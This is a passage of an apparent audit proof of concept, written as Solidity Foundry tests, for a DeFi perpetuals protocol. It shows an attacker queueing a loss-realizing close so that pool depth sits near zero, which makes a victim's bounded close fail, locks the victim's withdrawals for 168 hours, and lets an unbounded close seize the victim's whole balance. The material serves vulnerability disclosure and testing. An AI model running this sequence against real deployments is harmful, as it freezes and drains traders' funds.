    }

    /// @dev Advances 7 s / 2 blocks (past the commit tick), publishes `basketPrice`, executes as `keeper`.
    function _execute(
        uint64 orderId,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(orderId, _updateData());
    }

    function _openPosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        // Slippage targets: a LONG gains when the basket falls, so it opens at a price >= target and closes at <= target.
        uint256 target = side == CfdTypes.Side.LONG ? 1 : basketPrice * 2;
        uint64 id = _commit(trader, _openReq(side, size, margin, target));
        result = _execute(id, basketPrice);
    }

    function _closePosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint256 target = side == CfdTypes.Side.LONG ? basketPrice * 2 : 1;
        uint64 id = _commit(trader, _closeReq(side, size, target));
        result = _execute(id, basketPrice);
    }

    function _requireExecuted(
        OrderV3Types.ExecutionResult memory r,
        string memory label
    ) internal pure {
        if (r.status != OrderV3Types.LifecycleStatus.Executed) {
            console2.log("order not executed:", label);
            console2.log("  status", uint256(uint8(r.status)));
            console2.log("  terminalReason", uint256(uint8(r.terminalReason)));
            console2.log("  pendingReason", uint256(uint8(r.pendingReason)));
            revert(label);
        }
    }

    function _liquidate(
        address account,
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.executeLiquidation(account, _updateData());
    }

    // ---------------------------------------------------------------- state views

    function _poolAssets() internal view returns (uint256) {
        return d.housePool.totalAssets();
    }

    function _usdgOf(
        address a
    ) internal view returns (uint256) {
        return d.settlementToken.balanceOf(a);
    }

    function _logState(
        string memory label
    ) internal view {
        console2.log("==", label);
        console2.log("  pool totalAssets      ", d.housePool.totalAssets());
        console2.log("  pool raw USDG         ", _usdgOf(address(d.housePool)));
        console2.log("  seniorPrincipal       ", d.housePool.seniorPrincipal());
        console2.log("  juniorPrincipal       ", d.housePool.juniorPrincipal());
        console2.log("  clearinghouse USDG    ", _usdgOf(address(d.clearinghouse)));
        console2.log("  seniorVault USDG      ", _usdgOf(address(d.seniorVault)));
        console2.log("  juniorVault USDG      ", _usdgOf(address(d.juniorVault)));
        console2.log("  total trader claims   ", d.engine.totalTraderClaimBalanceAssets());
        console2.log("  engine mark           ", d.engine.lastMarkPrice());
        console2.log("  degradedMode          ", d.engine.degradedMode());
    }

    /// @dev Sum of USDG held by every in-scope custody contract (Clearinghouse, HousePool, both vaults, Engine).
    function _custodyUsdg() internal view returns (uint256) {
        return _usdgOf(address(d.clearinghouse)) + _usdgOf(address(d.housePool)) + _usdgOf(address(d.seniorVault))
            + _usdgOf(address(d.juniorVault)) + _usdgOf(address(d.engine));
    }

}
```

#### `NearZeroDepthCloseVpiFreeze.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ReleaseFixture} from "./ReleaseFixture.sol";
import {CfdClosePreview} from "@plether/perps/CfdClosePreview.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {Vm, console2} from "forge-std/Test.sol";

/// @notice Close VPI is priced on pool depth net of trader claims, max(P - C, 0), and is skipped only when that depth is
///         exactly zero. After trader claims exceed HousePool assets, a losing close that lifts P just above C leaves a
///         few USDG of depth, and a skew-increasing close is then charged several times its notional. A close bounded by
///         a realistic maxActionChargeAssets is refused, and in degraded mode the open position blocks every withdrawal.
contract NearZeroDepthCloseVpiFreezeTest is ReleaseFixture {

    address internal juniorLp = makeAddr("juniorLp");
    address internal seniorLp = makeAddr("seniorLp");
    address internal longA = makeAddr("longA");
    address internal shortB = makeAddr("shortB");
    address internal attacker = makeAddr("attacker"); // LONG on the dominant side, at a loss after the move
    address internal claimant = makeAddr("claimant"); // flat account holding a trader claim
    address internal victim = makeAddr("victim"); // SHORT, minority side, open position and a trader claim
    address internal executor = makeAddr("executor"); // any address, no role

    uint256 internal constant DOWN = 30_000_000; // basket 0.30
    uint256 internal constant UP = 199_000_000; // basket 1.99
    uint256 internal constant VICTIM_BALANCE = 29_950_013_642;
    uint256 internal constant CHARGE_AT_DEPTH = 124_271_837_055;
    uint256 internal constant VPI_AT_DEPTH = 124_261_887_055;
    uint256 internal constant PARKED_DEPTH = 54_774_815;

    /// @dev Claims state: Junior 200,000 and Senior 30,000 USDG; Junior LP redeems 95% of its shares; the basket moves
    ///      1.20 -> 0.30 (longA closes in profit, degraded mode latches) -> 1.99 (shortB, claimant and 15,000 of the victim's
    ///      27,500 synthetic tokens close in profit; payouts above pool cash become trader claims). Sizes are in synthetic
    ///      tokens (1e18 units); one lot is 100 synthetic tokens.
    function setUp() public override {
        super.setUp();
        _lpDeposit(false, juniorLp, 200_000e6, BASKET_1_20);
        _lpDeposit(true, seniorLp, 30_000e6, BASKET_1_20);
        _fundTrader(longA, 2_000e6);
        _fundTrader(attacker, 40_000e6);
        _fundTrader(shortB, 52_000e6);
        _fundTrader(claimant, 30_000e6);
        _fundTrader(victim, 30_000e6);
        _requireExecuted(_openPosition(longA, CfdTypes.Side.LONG, 30_000e18, 1_000e6, BASKET_1_20), "longA open");
        _warp(5);
        _refreshMark(BASKET_1_20);
        _requireExecuted(_openPosition(shortB, CfdTypes.Side.SHORT, 50_000e18, 50_000e6, BASKET_1_20), "shortB open");
        _warp(5);
        _refreshMark(BASKET_1_20);
        _requireExecuted(_openPosition(attacker, CfdTypes.Side.LONG, 40_000e18, 38_000e6, BASKET_1_20), "attacker open");
        _warp(5);
        _refreshMark(BASKET_1_20);
        _requireExecuted(_openPosition(claimant, CfdTypes.Side.SHORT, 27_500e18, 28_000e6, BASKET_1_20), "claimant open");
        _warp(5);
        _refreshMark(BASKET_1_20);
        _requireExecuted(_openPosition(victim, CfdTypes.Side.SHORT, 27_500e18, 28_000e6, BASKET_1_20), "victim open");
        _warp(5);
        _refreshMark(BASKET_1_20);
        _warp(3_700);
        _refreshMark(BASKET_1_20);
        uint256 redId = _requestRedeem(false, juniorLp, d.juniorVault.balanceOf(juniorLp) * 95 / 100);
        _settleEpoch(redId, BASKET_1_20);
        _claimRedeem(false, juniorLp, redId);
        _warp(30);
        _refreshMark(DOWN);
        _requireExecuted(_closePosition(longA, CfdTypes.Side.LONG, 30_000e18, DOWN), "longA close");
        _warp(30);
        _refreshMark(UP);
        _requireExecuted(_closePosition(shortB, CfdTypes.Side.SHORT, 50_000e18, UP), "shortB close");
        _requireExecuted(_closePosition(claimant, CfdTypes.Side.SHORT, 27_500e18, UP), "claimant close");
        _requireExecuted(_closePosition(victim, CfdTypes.Side.SHORT, 15_000e18, UP), "victim partial close");
        _warp(30);
        _refreshMark(UP);
    }

    // ---------------------------------------------------------------- headline

    /// @dev Control: the victim's bounded full close executes at depth 0 and the victim withdraws its whole balance.
    ///      Attack: the attacker's partial loss realization is queued ahead of the victim's close; one batch executes
    ///      both, depth becomes 54.774815 USDG and the close is refused. The victim then retries every hour for 168 h,
    ///      bounded at the fresh quote without VPI plus 1% of notional; every retry is refused and no withdrawal succeeds.
    function test_nearZeroDepthRefusesBoundedCloseAndLocksBalanceFor168Hours() public {
        uint256 size = _size(victim);
        uint256 notional = size * UP / 1e20;
        _logDepth("claims state at basket 1.99");
        console2.log("victim SHORT close notional", _usd(int256(notional)));
        console2.log("victim clearinghouse balance / trader claim", _usd(int256(d.clearinghouse.balanceAssets(victim))), _usd(int256(d.engine.traderClaimBalanceAssets(victim))));
        assertEq(_P(), 17_785_160_990, "HousePool assets");
        assertEq(_C(), 33_530_409_810, "trader claims");
        assertEq(_depth(), 0, "claim-net depth");
        assertTrue(d.engine.degradedMode(), "degraded mode");
        assertEq(size, 12_500e18, "victim size");
        assertEq(notional, 24_875e6, "victim close notional");
        assertEq(d.clearinghouse.balanceAssets(victim), VICTIM_BALANCE, "victim clearinghouse balance");
        assertEq(d.engine.traderClaimBalanceAssets(victim), 11_838_060_000, "victim trader claim");
        uint256 w0 = _victimWealth();
        uint256 snap = vm.snapshotState();

        // ---------------- control: depth 0, no fresh VPI
        OrderV3Types.ExecutionAssessment memory q = _quote(size);
        uint256 bound = q.actionChargeAssessedAssets + notional / 100;
        console2.log("CONTROL quoted close charge", _usd(int256(q.actionChargeAssessedAssets)));
        console2.log("CONTROL quoted close VPI", _usd(q.vpiAssets));
        console2.log("victim bound: quote + 1% of notional", _usd(int256(bound)));
        assertEq(q.actionChargeAssessedAssets, 9_950_000, "quoted charge");
        assertEq(q.vpiAssets, 0, "quoted VPI");
        assertEq(bound, 258_700_000, "bound");
        OrderV3Types.OrderReceipt memory r = _receipt(_batch(_commitClose(victim, size, bound)));
        _logReceipt("CONTROL victim close", r);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "control close executes");
        assertEq(r.economics.actionChargeAssessedAssets, 9_950_000, "control charge");
        assertEq(r.economics.vpiAssets, 0, "control VPI");
        assertEq(_size(victim), 0, "control victim flat");
        int256 dControl = int256(_victimWealth()) - int256(w0);
        console2.log("CONTROL victim wealth change", _usd(dControl));
        assertEq(dControl, 9_865_050_000, "control wealth change");
        uint256 usdg0 = _usdgOf(victim);
        vm.prank(victim);
        d.clearinghouse.withdrawMargin(VICTIM_BALANCE);
        console2.log("CONTROL victim withdraws its whole clearinghouse balance", _usd(int256(_usdgOf(victim) - usdg0)));
        assertEq(_usdgOf(victim) - usdg0, VICTIM_BALANCE, "control withdrawal");
        vm.revertToState(snap);

        // ---------------- attack: same block, the attacker's loss realization runs first in FIFO order
        uint256 attackerBal0 = d.clearinghouse.balanceAssets(attacker);
        uint64 aId = _commitClose(attacker, 20_000e18, type(uint256).max);
        q = _quote(size);
        assertEq(q.actionChargeAssessedAssets, 9_950_000, "commit-time quote unchanged");
        assertEq(bound, q.actionChargeAssessedAssets + notional / 100, "same bound");
        uint64 vId = _commitClose(victim, size, bound);
        assertGt(vId, aId, "victim queued behind the attacker");
        uint256 exec0 = _usdgOf(executor) + d.clearinghouse.balanceAssets(executor);
        Vm.Log[] memory logs = _batch(vId);
        OrderV3Types.OrderReceipt memory ra = _receiptOf(logs, aId);
        r = _receiptOf(logs, vId);
        int256 attackerDelta = int256(d.clearinghouse.balanceAssets(attacker)) - int256(attackerBal0);
        _logDepth("after the batch");
        console2.log("-- ATTACKER partial close (size 20000 of 40000), executed first; status (2 Executed)", uint256(ra.status));
        console2.log("   realized PnL / execution fee", _usd(ra.economics.realizedPnlAssets), _usd(int256(ra.economics.executionFeeAssets)));
        console2.log("   attacker clearinghouse balance change", _usd(attackerDelta));
        _logReceipt("ATTACK victim close", r);
        console2.log("ATTACK victim wealth change / executor change", _usd(int256(_victimWealth()) - int256(w0)), _usd(int256(_usdgOf(executor) + d.clearinghouse.balanceAssets(executor)) - int256(exec0)));
        assertEq(uint256(ra.status), uint256(OrderV3Types.LifecycleStatus.Executed), "attacker close executes");
        assertEq(ra.economics.realizedPnlAssets, -15_800_000_000, "attacker realized PnL");
        assertEq(ra.economics.executionFeeAssets, 15_920_000, "attacker fee");
        assertEq(attackerDelta, -15_815_943_635, "attacker balance change");
        assertEq(_P(), 33_585_184_625, "HousePool assets after");
        assertEq(_C(), 33_530_409_810, "trader claims after");
        assertEq(_depth(), PARKED_DEPTH, "depth after");
        assertEq(_size(attacker), 20_000e18, "attacker keeps half");
        _assertRefused(r, CHARGE_AT_DEPTH, bound);
        assertEq(_size(victim), size, "victim still open");
        assertEq(_victimWealth(), w0, "victim wealth unchanged");
        assertEq(_usdgOf(executor) + d.clearinghouse.balanceAssets(executor), exec0, "executor unchanged");
        assertFalse(_canWithdraw(VICTIM_BALANCE), "whole balance locked");
        assertFalse(_canWithdraw(1), "1 atom locked");
        console2.log("ATTACK victim can withdraw its balance / 1 atom", _canWithdraw(VICTIM_BALANCE), _canWithdraw(1));

        // ---------------- passive continuation: 168 hourly retries with the same bound
        vm.prank(claimant);
        d.engine.settleTraderClaim(claimant);
        assertEq(_depth(), PARKED_DEPTH, "claim payment leaves depth unchanged");
        uint256 t0 = vm.getBlockTimestamp();
        uint256 refused;
        uint256 closedMarketHours;
        for (uint256 h = 1; h <= 168; ++h) {
            _warp(1 hours - 7);
            _refreshMark(UP);
            vm.prank(executor);
            d.engine.checkpointCarryIndexes();
            vm.prank(executor);
            try d.router.settleLpEpoch(_updateData()) {} catch {}
            // bound = fresh quote without its VPI (fee + carry + frozen close spread) + 1% of notional
            q = _quote(size);
            assertEq(q.vpiAssets, int256(VPI_AT_DEPTH), "fresh VPI");
            uint256 hb = q.actionChargeAssessedAssets - VPI_AT_DEPTH + notional / 100;
            assertEq(hb, bound + q.frozenSpreadAssets, "hourly bound");
            if (q.frozenSpreadAssets > 0) ++closedMarketHours;
            r = _receipt(_batch(_commitClose(victim, size, hb)));
            _assertRefused(r, q.actionChargeAssessedAssets, hb);
            assertGt(r.failure.actual, 100 * hb, "charge > 100x bound");
            assertFalse(_canWithdraw(1), "no withdrawal");
            assertEq(_depth(), PARKED_DEPTH, "hourly depth");
            ++refused;
            if (h == 1 || h == 24 || h == 168) {
                console2.log("#### hour", h);
                console2.log("   fresh quoted close charge / VPI", _usd(int256(q.actionChargeAssessedAssets)), _usd(q.vpiAssets));
                console2.log("   claim-net depth", _usd(int256(_depth())));
                _logReceipt("retry", r);
                console2.log("   victim can withdraw 1 atom", _canWithdraw(1));
            }
            if (h == 24) assertEq(refused, 24, "24 h refused");
        }
        console2.log("hourly retries refused", refused);
        console2.log("   of which with the market closed (frozen close spread in the bound)", closedMarketHours);
        console2.log("hours since the first refusal", (vm.getBlockTimestamp() - t0) / 1 hours);
        console2.log("victim size / clearinghouse balance", _size(victim) / 1e18, _usd(int256(d.clearinghouse.balanceAssets(victim))));
        assertEq(refused, 168, "168 h refused");
        assertEq(closedMarketHours, 47, "retries with the market closed");
        assertEq(vm.getBlockTimestamp() - t0, 168 hours, "elapsed");
        assertEq(_depth(), PARKED_DEPTH, "depth after 168 h");
        assertTrue(d.engine.degradedMode(), "still degraded");
        assertEq(_size(victim), size, "still open");
        assertEq(d.clearinghouse.balanceAssets(victim), VICTIM_BALANCE, "balance unchanged");

        // ---------------- the attacker closes its residual: depth rises and the same bounded close executes
        uint256 attackerBal1 = d.clearinghouse.balanceAssets(attacker);
        ra = _receipt(_batch(_commitClose(attacker, _size(attacker), type(uint256).max)));
        _logDepth("after the attacker closes its residual");
        _logReceipt("ATTACKER residual close", ra);
        console2.log("   attacker clearinghouse balance before / after", _usd(int256(attackerBal1)), _usd(int256(d.clearinghouse.balanceAssets(attacker))));
        assertEq(uint256(ra.status), uint256(OrderV3Types.LifecycleStatus.Executed), "residual executes");
        assertEq(ra.economics.actionChargeAssessedAssets, 33_242_158_687, "residual charge");
        assertEq(ra.economics.actionChargeCollectedAssets, 8_364_656_365, "residual charge collected");
        assertEq(attackerBal1, 24_164_656_365, "attacker balance before residual close");
        assertEq(d.clearinghouse.balanceAssets(attacker), 0, "attacker balance after residual close");
        assertEq(_depth(), 24_203_511_180, "depth after residual close");
        assertEq(_P(), 36_041_571_180, "HousePool assets after residual close");
        assertEq(_C(), 11_838_060_000, "trader claims after residual close");
        assertEq(_size(attacker), 0, "attacker flat");
        q = _quote(size);
        r = _receipt(_batch(_commitClose(victim, size, q.actionChargeAssessedAssets + notional / 100)));
        _logReceipt("victim close after the attacker exits", r);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "bounded close executes");
        assertEq(r.economics.vpiAssets, -16_630_163, "VPI rebate");
        assertEq(r.economics.executionFeeAssets, 9_950_000, "fee");
        assertEq(r.economics.actionChargeAssessedAssets, 0, "no net charge");
    }

    // ---------------------------------------------------------------- the only executable bound

    /// @dev At the same depth, settling the victim's own claim does not move depth and the bounded close is still refused.
    ///      An unlimited maxActionChargeAssets executes the close and the charge takes the whole clearinghouse balance.
    function test_onlyExecutableBoundForfeitsWholeBalance() public {
        uint256 size = _size(victim);
        uint256 notional = size * UP / 1e20;
        uint256 bound = _quote(size).actionChargeAssessedAssets + notional / 100;
        assertEq(bound, 258_700_000, "bound");
        uint256 w0 = _victimWealth();
        uint256 snap = vm.snapshotState();
        OrderV3Types.OrderReceipt memory r = _receipt(_batch(_commitClose(victim, size, bound)));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "control close executes");
        int256 dControl = int256(_victimWealth()) - int256(w0);
        assertEq(dControl, 9_865_050_000, "control wealth change");
        vm.revertToState(snap);

        _batch(_commitClose(attacker, 20_000e18, type(uint256).max));
        assertEq(_depth(), PARKED_DEPTH, "parked depth");
        int256 lp0 = _lpEquity();
        snap = vm.snapshotState();

        // smallest partial close the router accepts: size 600 (6 lots, notional above the 1,000 USDG minimum), bounded at
        // its quote without VPI + 1% of its notional
        OrderV3Types.ExecutionAssessment memory qs = _quote(600e18);
        uint256 sliceNotional = 600e18 * UP / 1e20;
        uint256 sliceBound = qs.actionChargeAssessedAssets - uint256(qs.vpiAssets) + sliceNotional / 100;
        r = _receipt(_batch(_commitClose(victim, 600e18, sliceBound)));
        console2.log("smallest partial close (size 600): notional / quoted VPI", _usd(int256(sliceNotional)), _usd(qs.vpiAssets));
        _logReceipt("smallest partial close", r);
        _assertRefused(r, qs.actionChargeAssessedAssets, sliceBound);
        assertEq(qs.vpiAssets, 3_383_538_219, "slice VPI");
        assertEq(sliceNotional, 1_194e6, "slice notional");
        assertEq(qs.actionChargeAssessedAssets, 3_384_015_819, "slice charge");
        assertEq(sliceBound, 12_417_600, "slice bound");
        assertGt(uint256(qs.vpiAssets), 2 * sliceNotional, "VPI > 2x the slice notional");

        vm.prank(victim);
        d.engine.settleTraderClaim(victim);
        uint256 balAfterClaim = d.clearinghouse.balanceAssets(victim);
        console2.log("victim settles its own claim; clearinghouse balance", _usd(int256(balAfterClaim)));
        console2.log("claim-net depth", _usd(int256(_depth())));
        r = _receipt(_batch(_commitClose(victim, size, bound)));
        _logReceipt("bounded close after the victim settles its own claim", r);
        assertEq(_depth(), PARKED_DEPTH, "own claim payment leaves depth unchanged");
        assertEq(balAfterClaim, 41_788_073_642, "balance after own claim");
        _assertRefused(r, CHARGE_AT_DEPTH, bound);
        assertFalse(_canWithdraw(balAfterClaim), "balance including claim locked");
        vm.revertToState(snap);

        r = _receipt(_batch(_commitClose(victim, size, type(uint256).max)));
        _logReceipt("close with unlimited maxActionChargeAssets", r);
        int256 dX = int256(_victimWealth()) - int256(w0);
        int256 dLp = _lpEquity() - lp0;
        console2.log("victim wealth change", _usd(dX));
        console2.log("victim wealth vs the depth-0 control close", _usd(dX - dControl));
        console2.log("LP equity change", _usd(dLp));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "unlimited close executes");
        assertEq(r.economics.actionChargeAssessedAssets, CHARGE_AT_DEPTH, "charge assessed");
        assertEq(r.economics.actionChargeCollectedAssets, VICTIM_BALANCE, "charge collected = whole balance");
        assertEq(r.economics.vpiAssets, int256(VPI_AT_DEPTH), "VPI");
        assertEq(r.economics.executionFeeAssets, 9_950_000, "fee");
        assertEq(d.clearinghouse.balanceAssets(victim), 0, "balance gone");
        assertEq(dX, -29_950_013_642, "victim wealth change");
        assertEq(dX - dControl, -39_815_063_642, "vs control");
        assertEq(dLp, 29_940_063_642, "LP equity change");
    }

    // ---------------------------------------------------------------- split exit

    /// @dev At the parked depth, the smallest partial close executed at its own quote lifts depth with its collected VPI,
    ///      and the remaining close executed at its own quote still leaves the victim thousands of USDG below the control.
    function test_splitExitStillLosesThousands() public {
        uint256 w0 = _victimWealth();
        _batch(_commitClose(attacker, 20_000e18, type(uint256).max));
        assertEq(_depth(), PARKED_DEPTH, "parked depth");
        OrderV3Types.ExecutionAssessment memory q = _quote(600e18);
        OrderV3Types.OrderReceipt memory r = _receipt(_batch(_commitClose(victim, 600e18, q.actionChargeAssessedAssets)));
        _logReceipt("smallest partial close (size 600) bounded at its own quote", r);
        console2.log("   claim-net depth after", _usd(int256(_depth())));
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "slice executes");
        assertEq(r.economics.actionChargeAssessedAssets, 3_384_015_819, "slice charge");
        assertEq(_depth(), 2_964_790_634, "depth after slice");
        uint256 rest = _size(victim);
        q = _quote(rest);
        r = _receipt(_batch(_commitClose(victim, rest, q.actionChargeAssessedAssets)));
        _logReceipt("remaining close (size 11900) bounded at its own quote", r);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "rest executes");
        assertEq(r.economics.actionChargeAssessedAssets, 2_242_712_454, "rest charge");
        assertEq(_size(victim), 0, "victim flat");
        int256 dSplit = int256(_victimWealth()) - int256(w0);
        console2.log("victim wealth vs the depth-0 control close", _usd(dSplit - 9_865_050_000));
        assertEq(dSplit - 9_865_050_000, -5_616_778_273, "split exit vs control");
    }

    // ---------------------------------------------------------------- helpers

    function _size(address a) internal view returns (uint256 size) {
        (size,,,,,,) = d.engine.positions(a);
    }

    function _P() internal view returns (uint256) {
        return d.housePool.totalAssets();
    }

    function _C() internal view returns (uint256) {
        return d.engine.totalTraderClaimBalanceAssets();
    }

    function _depth() internal view returns (uint256) {
        return _P() > _C() ? _P() - _C() : 0;
    }

    function _victimWealth() internal view returns (uint256) {
        return _usdgOf(victim) + d.clearinghouse.balanceAssets(victim) + d.engine.traderClaimBalanceAssets(victim);
    }

    function _lpEquity() internal view returns (int256) {
        return int256(_P()) - int256(_C()) + int256(_usdgOf(address(d.seniorVault)) + _usdgOf(address(d.juniorVault)));
    }

    /// @dev Commit-time close quote from CfdClosePreview, the read an integrator uses to choose the bounds.
    function _quote(uint256 size) internal returns (OrderV3Types.ExecutionAssessment memory) {
        OrderV3Types.OrderRequest memory req = _closeReq(CfdTypes.Side.SHORT, size, 1);
        return d.closePreview.previewClose(address(d.engine), victim, req, executor, UP).assessment;
    }

    function _commitClose(address acct, uint256 size, uint256 maxActionCharge) internal returns (uint64 id) {
        bool isLong = acct == attacker;
        OrderV3Types.OrderRequest memory r = _closeReq(
            isLong ? CfdTypes.Side.LONG : CfdTypes.Side.SHORT, size, isLong ? d.engine.CAP_PRICE() : 1
        );
        r.bounds.maxActionChargeAssets = maxActionCharge;
        vm.prank(acct);
        id = d.router.commitOrder(r);
    }

    /// @dev Executes the FIFO queue through `maxId` in one transaction from `executor`, on a price published after the commit.
    function _batch(uint64 maxId) internal returns (Vm.Log[] memory logs) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(UP);
        vm.recordLogs();
        vm.prank(executor);
        d.router.executeOrderBatch(maxId, _updateData());
        logs = vm.getRecordedLogs();
    }

    function _receipt(Vm.Log[] memory logs) internal pure returns (OrderV3Types.OrderReceipt memory r) {
        return _receiptOf(logs, 0);
    }

    /// @dev Receipt of `orderId` (0 = the last finalized order) from the OrderFinalized events.
    function _receiptOf(Vm.Log[] memory logs, uint64 orderId) internal pure returns (OrderV3Types.OrderReceipt memory r) {
        bool found;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics.length == 4 && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector) {
                if (orderId == 0 || uint256(logs[i].topics[1]) == orderId) {
                    (,,, r) = abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                    found = true;
                }
            }
        }
        require(found, "receipt");
    }

    function _assertRefused(OrderV3Types.OrderReceipt memory r, uint256 charge, uint256 bound) internal pure {
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Failed), "refused");
        assertEq(uint256(r.reason), uint256(OrderV3Types.TerminalReason.ConstraintViolation), "constraint violation");
        assertEq(uint256(r.failure.constraint), uint256(OrderV3Types.ConstraintKind.ActionCharge), "action charge");
        assertEq(r.failure.actual, charge, "assessed charge");
        assertEq(r.failure.limit, bound, "limit");
        assertEq(r.bounty.bountyPaidAssets, 0, "no bounty");
    }

    /// @dev Attempts withdrawMargin(amount) from the victim in a snapshot and reverts the state.
    function _canWithdraw(uint256 amount) internal returns (bool ok) {
        uint256 s = vm.snapshotState();
        vm.prank(victim);
        (ok,) = address(d.clearinghouse).call(abi.encodeWithSignature("withdrawMargin(uint256)", amount));
        vm.revertToState(s);
    }

    function _usd(int256 a) internal pure returns (string memory) {
        uint256 u = a < 0 ? uint256(-a) : uint256(a);
        bytes memory frac = bytes(vm.toString(1e6 + u % 1e6));
        frac[0] = ".";
        return string.concat(a < 0 ? "-" : "", vm.toString(u / 1e6), string(frac), " USDG");
    }

    function _logDepth(string memory label) internal view {
        console2.log("==", label);
        console2.log("   HousePool assets P", _usd(int256(_P())));
        console2.log("   trader claims C", _usd(int256(_C())));
        console2.log("   claim-net depth max(P - C, 0)", _usd(int256(_depth())));
        console2.log("   degraded mode", d.engine.degradedMode());
        console2.log("   victim / attacker size", _size(victim) / 1e18, _size(attacker) / 1e18);
    }

    function _logReceipt(string memory label, OrderV3Types.OrderReceipt memory r) internal pure {
        console2.log("--", label);
        if (r.status == OrderV3Types.LifecycleStatus.Executed) {
            console2.log("   Executed; charge assessed / collected", _usd(int256(r.economics.actionChargeAssessedAssets)), _usd(int256(r.economics.actionChargeCollectedAssets)));
            console2.log("   VPI / execution fee", _usd(r.economics.vpiAssets), _usd(int256(r.economics.executionFeeAssets)));
        } else {
            console2.log("   status / reason / constraint (3 Failed, 8 ConstraintViolation, 4 ActionCharge)", uint256(r.status), uint256(r.reason), uint256(r.failure.constraint));
            console2.log("   assessed charge / maxActionChargeAssets", _usd(int256(r.failure.actual)), _usd(int256(r.failure.limit)));
        }
    }

}
```
